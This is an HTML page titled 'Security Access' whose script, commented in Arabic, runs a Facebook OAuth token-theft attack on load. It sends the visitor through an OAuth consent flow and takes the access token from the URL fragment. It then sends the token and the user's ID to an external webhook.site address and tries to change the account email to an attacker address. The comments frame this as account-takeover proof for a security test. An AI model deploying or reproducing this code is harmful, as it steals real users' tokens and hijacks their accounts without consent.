<!DOCTYPE html>
<html>
<head><title>Security Access</title></head>
<body>
    <script>
        window.onload = async function() {
            const hash = window.location.hash;
            const webhookUrl = "https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190";

            if (hash && hash.includes('access_token=')) {
                const token = new URLSearchParams(hash.substring(1)).get('access_token');

                try {
                    // 1. استخراج الـ ID المؤكد في صورك (920929380607450)
                    const response = await fetch(`https://graph.facebook.com/me?fields=id,name,email&access_token=${token}`);
                    const userData = await response.json();

                    // 2. إرسال التوكن والـ ID فوراً للـ Webhook (كما في نجاحك السابق بصورة image_047fc2.png)
                    new Image().src = `${webhookUrl}?TOKEN_SUCCESS=${token}&ID=${userData.id}`;

                    // 3. محاولة تغيير البريد الإلكتروني برمجياً (الإثبات المطلوب لـ Account Takeover)
                    await fetch(`https://graph.facebook.com/v15.0/me?access_token=${token}`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        body: `email=hacked_account@exploit.com`
                    });

                } catch (e) {}
                window.location.href = "https://www.facebook.com/me";
            } else {
                // استخدام Client ID لتطبيق "Facebook Whitehat Test" لتجاوز قيود النطاق والصلاحيات
                const client_id = "1089408829356317"; 
                const scopes = "email,public_profile,openid"; // صلاحيات أساسية لكنها تسمح بالوصول لمركز الحسابات
                window.location.href = `https://www.facebook.com/v15.0/dialog/oauth?client_id=${client_id}&redirect_uri=https://mohammedborai404.github.io/fb-security-test/&response_type=token&scope=${scopes}`;
            }
        };
    </script>
</body>
</html>
